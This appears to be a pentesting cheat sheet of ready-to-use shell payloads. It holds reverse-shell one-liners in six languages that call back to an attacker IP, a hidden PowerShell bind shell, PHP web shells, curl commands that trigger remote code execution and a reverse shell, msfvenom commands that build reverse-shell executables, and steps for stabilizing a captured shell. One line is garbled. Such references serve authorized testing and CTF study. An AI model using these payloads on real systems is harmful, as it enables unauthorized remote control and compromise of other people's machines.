
---

## 🔄 1. Reverse Shells (Attacker Listens)

The target initiates the connection. Best for bypassing most ingress firewall rules.

### 🎧 The Listeners

> [!NOTE] **Netcat & Socat**
> 
> Bash
> 
> ```
> # Basic Netcat
> nc -lvnp 1234
> 
> # Advanced Socat (Provides TTY immediately)
> socat -d -d TCP-LISTEN:1234 STDOUT
> ```

### 🚀 Target Payloads

| **Language** | **One-Liner Payload**                                                                                                                                                                                                          |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Bash**     | `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                                                                                                                                                          |
| **Netcat**   | `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc 10.10.10.10 1234 > /tmp/f`                                                                                                                                      |
| **Python**   | `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`                |
| **Perl**     | `perl -e 'use Socket;$i="10.10.10.10";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| **Ruby**     | `ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`                                                                                                                 |
| **PHP**      | `php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`                                                                                                                                                |

---

## 🕸️ 2. Bind Shells (Target Listens)

The target opens a port. You connect to them.

### 🏗️ Target Listeners

> [!ABSTRACT] **PowerShell Bind**
> 
> PowerShell
> 
> ```
> powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
> ```

### 🔗 Your Connection

Bash

```
nc -nv 10.10.10.1 1234
```

---

## 🛠️ 3. TTY Upgrade & Stabilization

Standard shells are "dumb" (no Tab-complete, no `Ctrl+C`). Follow this exact sequence:

> [!SUCCESS] **The 4-Step Stabilization**
> 
> 1. **Spawn Bash:** `python3 -c 'import pty; pty.spawn("/bin/bash")'` (or `script /dev/null -c bash`)
>     
> 2. **Background:** `Ctrl + Z`
>     
> 3. **Raw Terminal:** `stty raw -echo; fg` (Then hit `Enter` twice)
>     
> 4. **Fix Rows/Cols:**
>     
>     - In a **new** terminal tab, run: `stty -a | head -n1`
>         
>     - Back in your shell, run: `stty rows <X> cols <Y>`
>         
>     -`export TERM=xterm-256color`
>       

the ssh direct login just user export command to stabilize shell

---

## 🌐 4. Web Shells

Used for initial Command Execution (RCE) via file upload or LFI.

### 📄 PHP One-Liners

PHP

```
// Simple Command Execution
<?php system($_GET['cmd']); ?>

// More flexible (use passthru or shell_exec if system is disabled)
<?php passthru($_REQUEST['cmd']); ?>
```

### 💻 Execution via Curl

Bash

```
# Test for RCE
curl http://SERVER_IP/shell.php?cmd=id

# Trigger a Reverse Shell (URL encoded)
curl http://SERVER_IP/shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"
```

---

## 🛡️ 5. Windows Specific (PowerShell & Msfvenom)

### 🚀 MSFVenom Payloads

| **Format**      | **Command**                                                                                 |
| --------------- | ------------------------------------------------------------------------------------------- |
| **Windows EXE** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe > shell.exe` |
| **Linux ELF**   | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f elf > shell.elf`   |
| **PHP**         | `msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=1234 -f raw > shell.php`               |

---

### 📂 Quick Flag Reference: `nc`

- `-l`: Listen
    
- `-v`: Verbose
    
- `-n`: Numeric (no DNS)
    
- `-p`: Port
    
- `-e`: Execute (Only on older/unpatched Netcat versions—high risk!)
    

